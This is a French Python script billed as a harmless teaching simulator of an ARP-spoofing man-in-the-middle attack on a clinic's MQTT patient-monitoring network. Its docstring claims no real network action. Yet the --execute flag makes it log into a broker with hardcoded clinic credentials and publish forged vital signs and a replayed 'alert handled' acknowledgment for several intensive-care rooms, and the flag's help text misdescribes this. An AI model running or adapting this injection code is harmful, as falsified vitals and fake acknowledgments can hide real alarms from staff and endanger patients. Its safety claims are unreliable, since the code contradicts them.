#!/usr/bin/env python3
"""
Simulateur pédagogique d'attaque MITM par ARP Spoofing (version réécrite).

Ce module ne réalise AUCUNE action réseau réelle. Il simule le déroulement
d'une attaque en affichant des logs et en générant des payloads falsifiés
au format InfluxDB Line Protocol. Parfait pour des démonstrations en cours
ou des tests d'intégration sans risque.
"""

from __future__ import annotations

import argparse
import random
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Callable, Any

import paho.mqtt.client as mqtt


# -----------------------------------------------------------------------------
# 1. Modèle de données pour les paramètres de l'attaque
# -----------------------------------------------------------------------------
@dataclass
class AttackConfig:
    """Configuration complète d'un scénario d'attaque MITM simulée."""
    target_ip: str
    gateway_ip: str
    room_id: str
    patient_id: str
    broker_ip: str = "127.0.0.1"
    broker_port: int = 1883
    mqtt_user: str = "admin_clinique"
    mqtt_password: str = "clinique2026"
    ack_topic: str = "clinique/alerte/ack"
    ack_replay_delay: int = 5
    duration_seconds: int = 20
    dry_run: bool = True          # True = simulation sans envoi réel
    verbose: bool = False         # Affiche les logs détaillés

    @property
    def topic(self) -> str:
        """Topic MQTT dérivé de l'ID de chambre."""
        return f"clinique/chambre/{self.room_id}/vitaux"


# -----------------------------------------------------------------------------
# 2. Générateur de faux payloads (version améliorée)
# -----------------------------------------------------------------------------
class FakePayloadBuilder:
    """Constructeur de messages falsifiés au format InfluxDB Line Protocol."""

    @staticmethod
    def build(
        room_id: str,
        patient_id: str,
        spo2: float = 95.0,
        ecg_bpm: float = 76.0,
        alerte_active: bool = False,
        temperature: float = 36.5,
        pression_sys: float = 120.0,
        pression_dia: float = 80.0,
        timestamp_ms: Optional[int] = None,
        device_id: str = "SIM-ATTACK"
    ) -> str:
        """
        Génère une ligne InfluxDB avec les valeurs fournies.

        Si timestamp_ms est None, utilise l'horodatage courant.
        """
        if timestamp_ms is None:
            timestamp_ms = int(time.time() * 1000)

        tags = [
            f"chambre_id={room_id}",
            f"patient_id={patient_id}",
            f"device_id={device_id}",
            "service=soins_intensifs",
        ]
        fields = [
            f"spo2={spo2:.1f}",
            f"ecg_bpm={ecg_bpm:.1f}",
            f"temperature={temperature:.1f}",
            f"pression_sys={pression_sys:.1f}",
            f"pression_dia={pression_dia:.1f}",
            f"alerte_active={'true' if alerte_active else 'false'}",
            f"timestamp_esp={timestamp_ms}",
        ]
        return "vitaux_chambre," + ",".join(tags) + " " + ",".join(fields)

    @staticmethod
    def build_random(room_id: str, patient_id: str) -> str:
        """Génère un payload avec des valeurs vitales aléatoires (mais plausibles)."""
        spo2 = random.uniform(88, 100)
        ecg = random.uniform(60, 100)
        temp = random.uniform(36.0, 37.5)
        sys = random.uniform(100, 140)
        dia = random.uniform(60, 90)
        alerte = spo2 < 92 or ecg > 90  # alerte si oxygène bas ou tachycardie
        return FakePayloadBuilder.build(
            room_id, patient_id, spo2, ecg, alerte, temp, sys, dia
        )


# -----------------------------------------------------------------------------
# 3. Simulateur d'attaque (sans interaction réseau)
# -----------------------------------------------------------------------------
class MitmSimulator:
    """
    Simule le déroulement d'une attaque MITM par ARP Spoofing.

    Ne touche pas au réseau. Affiche des logs et les payloads qui seraient
    envoyés à intervalles réguliers.
    """

    # Liste de patients fictifs pour la démonstration
    DEFAULT_TARGETS = [
        {"room": "CH-001", "patient": "PAT-101"},
        {"room": "CH-002", "patient": "PAT-102"},
        {"room": "CH-003", "patient": "PAT-103"},
        {"room": "CH-004", "patient": "PAT-104"},
        {"room": "CH-005", "patient": "PAT-105"},
        {"room": "SI-001", "patient": "PAT-201"},
        {"room": "SI-002", "patient": "PAT-202"},
    ]

    def __init__(self, config: AttackConfig):
        self.config = config
        self.payload_builder = FakePayloadBuilder()
        self._start_time: Optional[float] = None
        self._stop_signal = False
        self.mqtt_client: Optional[mqtt.Client] = None

    def _log(self, message: str, level: str = "INFO") -> None:
        """Affiche un message si le mode verbose est activé ou si level est 'WARN'."""
        if self.config.verbose or level == "WARN":
            print(f"[{level}] {message}")

    def _simulate_arp_spoofing(self) -> None:
        """Simule l'empoisonnement ARP (affiche des logs)."""
        self._log(f"Début de l'attaque ARP Spoofing sur {self.config.target_ip} "
                  f"(passerelle {self.config.gateway_ip})", "WARN")
        self._log("Envoi de paquets ARP falsifiés pour rediriger le trafic...", "WARN")
        time.sleep(1)  # simule le temps d'empoisonnement

    def _send_fake_payload(self, room: str, patient: str) -> None:
        """Simule l'envoi d'un payload falsifié sur le topic MQTT."""
        payload = self.payload_builder.build_random(room, patient)
        topic = f"clinique/chambre/{room}/vitaux"
        self._log(f"Envoi sur {topic} : {payload}", "INFO")
        # Simule un court délai d'envoi
        time.sleep(0.2)

    def _connect_mqtt(self) -> None:
        """Établit une connexion MQTT si le mode d'exécution est activé."""
        if self.config.dry_run:
            return

        self.mqtt_client = mqtt.Client()
        self.mqtt_client.username_pw_set(self.config.mqtt_user, self.config.mqtt_password)

        try:
            self.mqtt_client.connect(self.config.broker_ip, self.config.broker_port, 60)
            self.mqtt_client.loop_start()
            self._log(f"Connecté au broker MQTT {self.config.broker_ip}:{self.config.broker_port}", "INFO")
        except Exception as exc:
            self._log(f"Impossible de se connecter au broker MQTT : {exc}", "WARN")
            self.mqtt_client = None

    def _disconnect_mqtt(self) -> None:
        """Déconnecte proprement le client MQTT si nécessaire."""
        if self.mqtt_client is not None:
            self.mqtt_client.loop_stop()
            self.mqtt_client.disconnect()
            self.mqtt_client = None

    def _publish_mqtt(self, topic: str, payload: str) -> None:
        """Publie un message MQTT si le mode d'exécution est activé."""
        if self.config.dry_run or self.mqtt_client is None:
            self._log(f"[DRY-RUN] Publication MQTT simulée sur {topic} : {payload}", "INFO")
            return

        result = self.mqtt_client.publish(topic, payload)
        rc = getattr(result, "rc", None)
        self._log(f"Publication MQTT sur {topic} (rc={rc}) : {payload}", "INFO")

    def _simulate_mqtt_publish(self, room: str, patient: str) -> None:
        """Simule la publication MQTT d'un faux message."""
        payload = self.payload_builder.build_random(room, patient)
        topic = f"clinique/chambre/{room}/vitaux"
        self._log(f"Envoi sur {topic} : {payload}", "INFO")
        self._publish_mqtt(topic, payload)

    def _capture_and_replay_ack(self) -> None:
        """Capture un message d'ack puis le rejoue plus tard pour simuler une fausse prise en charge."""
        timestamp_ms = int(time.time() * 1000)
        ack_payload = (
            f"alert_ack,chambre_id={self.config.room_id},patient_id={self.config.patient_id},"
            f"device_id=SIM-ATTACK ack=true,handled=true,ack_by=SIM-ATTACK,timestamp_esp={timestamp_ms}"
        )
        self._log("Capture d'un ack de prise en charge ...", "WARN")
        self._log(f"Ack capturé : {self.config.ack_topic} -> {ack_payload}", "INFO")
        time.sleep(1)
        self._log(
            f"Attente de {self.config.ack_replay_delay} secondes avant le replay de l'ack ...",
            "WARN"
        )
        time.sleep(self.config.ack_replay_delay)
        self._log(f"Ack rejoué : {self.config.ack_topic} : {ack_payload}", "INFO")
        self._publish_mqtt(self.config.ack_topic, ack_payload)

    def run(self) -> None:
        """Exécute la simulation complète de l'attaque."""
        self._log("Simulation MITM ARP Spoofing lancée", "WARN")
        self._log(f"Mode sec : {'activé' if self.config.dry_run else 'désactivé'}", "INFO")
        self._log(f"Durée : {self.config.duration_seconds} secondes", "INFO")
        self._log(f"Nombre de patients ciblés : {len(self.DEFAULT_TARGETS)}", "INFO")

        if not self.config.dry_run:
            self._connect_mqtt()

        # Étape 1 : Empoisonnement ARP
        self._simulate_arp_spoofing()

        # Étape 2 : Capture et replay de l'ack, puis injection de faux payloads
        self._capture_and_replay_ack()

        total_patients = len(self.DEFAULT_TARGETS)
        interval = max(1, self.config.duration_seconds // total_patients)

        self._start_time = time.time()
        elapsed = 0
        idx = 0

        while elapsed < self.config.duration_seconds:
            target = self.DEFAULT_TARGETS[idx % total_patients]
            room = target["room"]
            patient = target["patient"]

            self._log(f"👤 Cible : {room} / {patient}", "INFO")
            self._simulate_mqtt_publish(room, patient)

            # Attente jusqu'à l'intervalle suivant
            time.sleep(interval)
            elapsed = time.time() - self._start_time
            idx += 1

        # Étape 3 : Fin de l'attaque (restauration ARP)
        self._log("Arrêt de l'attaque - Restauration des tables ARP simulée", "WARN")
        self._disconnect_mqtt()
        self._log("Simulation terminée.", "INFO")


# -----------------------------------------------------------------------------
# 4. Point d'entrée principal avec interface CLI
# -----------------------------------------------------------------------------
def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Simulation pédagogique d'une attaque MITM par ARP Spoofing (réécrite)"
    )
    parser.add_argument("--target-ip", default="192.168.1.10",
                        help="IP de la machine cible (ex: le poste de l'infirmière)")
    parser.add_argument("--gateway-ip", default="192.168.1.1",
                        help="IP de la passerelle réseau")
    parser.add_argument("--room-id", default="SI-001",
                        help="Identifiant de la chambre principale pour le payload")
    parser.add_argument("--patient-id", default="PAT-201",
                        help="Identifiant du patient principal")
    parser.add_argument("--broker-ip", default="127.0.0.1",
                        help="Adresse IP du broker MQTT (simulé)")
    parser.add_argument("--broker-port", type=int, default=1883,
                        help="Port du broker MQTT")
    parser.add_argument("--mqtt-user", default="admin_clinique",
                        help="Utilisateur MQTT pour l'attaque")
    parser.add_argument("--mqtt-password", default="clinique2026",
                        help="Mot de passe MQTT pour l'attaque")
    parser.add_argument("--ack-topic", default="clinique/alerte/ack",
                        help="Topic MQTT sur lequel rejouer l'ack")
    parser.add_argument("--ack-delay", type=int, default=5,
                        help="Délai avant de rejouer le message ack (secondes)")
    parser.add_argument("--duration-seconds", type=int, default=20,
                        help="Durée de la simulation (secondes)")
    parser.add_argument("--execute", action="store_true",
                        help="Désactive le mode 'dry-run' (affiche simplement un message)")
    parser.add_argument("--verbose", action="store_true",
                        help="Affiche tous les détails de la simulation")
    return parser.parse_args()


def main() -> None:
    args = parse_arguments()

    # Construction de la configuration
    config = AttackConfig(
        target_ip=args.target_ip,
        gateway_ip=args.gateway_ip,
        room_id=args.room_id,
        patient_id=args.patient_id,
        broker_ip=args.broker_ip,
        broker_port=args.broker_port,
        mqtt_user=args.mqtt_user,
        mqtt_password=args.mqtt_password,
        ack_topic=args.ack_topic,
        ack_replay_delay=args.ack_delay,
        duration_seconds=args.duration_seconds,
        dry_run=not args.execute,
        verbose=args.verbose,
    )

    # Création du simulateur et lancement
    simulator = MitmSimulator(config)
    simulator.run()


if __name__ == "__main__":
    main()